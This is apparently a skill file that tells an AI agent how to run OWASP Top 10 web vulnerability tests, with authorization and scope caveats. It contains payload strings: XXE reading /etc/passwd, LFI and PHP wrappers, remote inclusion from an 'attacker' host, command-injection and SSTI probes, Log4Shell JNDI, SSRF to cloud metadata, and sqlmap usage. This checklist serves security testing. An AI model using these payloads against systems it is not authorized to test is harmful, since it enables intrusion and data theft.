---
name: owasp-web-testing
description: Use to apply systematic web vulnerability tests per OWASP Top 10 (2021) after reconnaissance: A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection (SQLi, XSS, SSRF, XXE, LFI/RFI, RCE, SSTI), A04 Insecure Design, A05 Security Misconfiguration, A06 Vulnerable and Outdated Components, A07 Identification and Authentication Failures, A08 Software and Data Integrity Failures, A09 Security Logging and Monitoring Failures, A10 SSRF. Keywords: sqlmap, sql injection, xss, ssrf, xxe, lfi, rfi, ssti, idor, csrf, upload, deserialization, vulnerability testing.
---

# Web Vulnerability Testing (OWASP Top 10)

Systematically test each OWASP category and record evidence per finding. Always preceded by the `recon` skill and, if a WAF is present, use the validated bypasses from the `waf-analysis` skill.

## Baseline
- Before testing, capture legitimate requests (authenticated GET/POST) that will serve as controls for comparing responses.
- Record average response times and status codes to differentiate behaviors.
- Prefer controlled environments (lab/staging) whenever possible.

## A01 — Broken Access Control
- **IDOR/BOLA**: swap object IDs (`/users/1001`, `/orders/12`) in authenticated routes and check whether another user can access foreign data.
- **BOPLA/BOPA**: change object/action fields (`role=admin`, `status: "paid"`), force methods (`PUT/PATCH/DELETE`), direct access to administrative functions.
- **Path traversal / forced browsing**: access `/admin`, `/backup`, `/debug`, config files directly.
- **Privilege escalation**: elevate a standard user to admin, use another user's token, list all resources.

## A02 — Cryptographic Failures
- Verify transport: HTTP to HTTPs (redirect), weak crypto (TLS 1.0/1.1, SSL), HSTS failure.
- Sensitive data in transit/storage: passwords in logs, tokens in URLs, PII in error responses, cache headers (`Cache-Control: public`).
- Server-side crypto: weak hashes (MD5/SHA1), predictable/enumerable IDs, reused IV, JWT with `alg: none` or weak HMAC.

## A03 — Injection
- **SQLi**: test every parameter with `'`, `"`, `--`, `;`, boolean/time/error/UNION payloads.
  - Detection: response difference (SQL error, logical behavior, timing).
  - Tooling: `sqlmap -u URL --batch --risk=2 --level=3` (respecting scope; use `--flush-session` between runs). Extract only minimal data (see `exploitation` skill).
- **XXE**: test `Content-Type: application/xml` with an external DTD (`<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>`), external entities in SOAP, OASIS-Open XML.
- **LFI/RFI**: path traversal (`../../etc/passwd`), PHP wrappers (`php://filter/convert.base64-encode/resource=index.php`), remote inclusion (`http://attacker/rce.txt`).
- **RCE / Command Injection**: payloads `;id`, `|whoami`, `$(id)`, `%60id%60`, backticks in parameters that feed system commands.
- **SSTI / Template Injection**: payloads `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` in engines (Jinja2, Twig, Freemarker, Velocity, Thymeleaf).
- **Insecure Deserialization**: Java payloads (`ysoserial`), Python pickle, PHP `unserialize` — only if it demonstrates impact without harm.

## A04 — Insecure Design
- Analyze business logic: payment flow, attempt limits, step verification, token reuse, price/quantity manipulation.
- Insecure defaults: default credentials, exposed administrative ports, accessible internal documentation.

## A05 — Security Misconfiguration
- Missing security headers (see `recon` skill item 6), `TRACE`/`OPTIONS` allowed, directory listing, unauthenticated panels, debug mode, verbose errors with stack traces/versions, permissive CORS.

## A06 — Vulnerable and Outdated Components
- Fingerprint versions (recon) and cross-reference with CVEs (searchsploit, NVD).
- Detect common components: old jQuery, EOL frameworks, Log4Shell (payload `\${jndi:ldap://...}` — only for controlled confirmation).

## A07 — Identification and Authentication Failures
- Weak/default credentials, missing rate limit/MFA, brute force (authorized and respecting limits), user enumeration (differentiated error messages), session fixation/regeneration, insecure cookie, predictable password reset, invalid/weak JWT.

## A08 — Software and Data Integrity Failures
- Unsigned dependencies (supply chain), auto-updates without verification, deserialization (see A03), exposed CI/CD data, exposed `.git`.

## A09 — Security Logging and Monitoring Failures
- Check for missing logging of sensitive actions (login, admin, delete), missing alerts/monitoring, logs without session/user IDs, no scanning detection.

## A10 — SSRF
- Test URL fields (fetch, import, webhook, redirect, avatar, preview): `http://127.0.0.1:80`, `http://169.254.169.254/latest/meta-data/` (AWS metadata), `http://[::1]`, decimal/hex/octal IPs, `http://localtest.me`, redirect via `http://169.254.169.254` to the inside, DNS rebinding (if authorized).
- Confirm impact accessing only what is necessary (do not exfiltrate secrets, see `exploitation` skill).

## Evidence per finding
For each confirmed vulnerability, save in `findings/`:
```
findings/
├── F-001-<name>.md    (title, OWASP category, full request, relevant response, initial severity)
└── payloads-F-001.txt (tested payloads, one per line)
```
Complete the evidence with SHA256 hashes of critical payloads and timestamps. Final severity, PoC and remediation go into the `reporting` skill.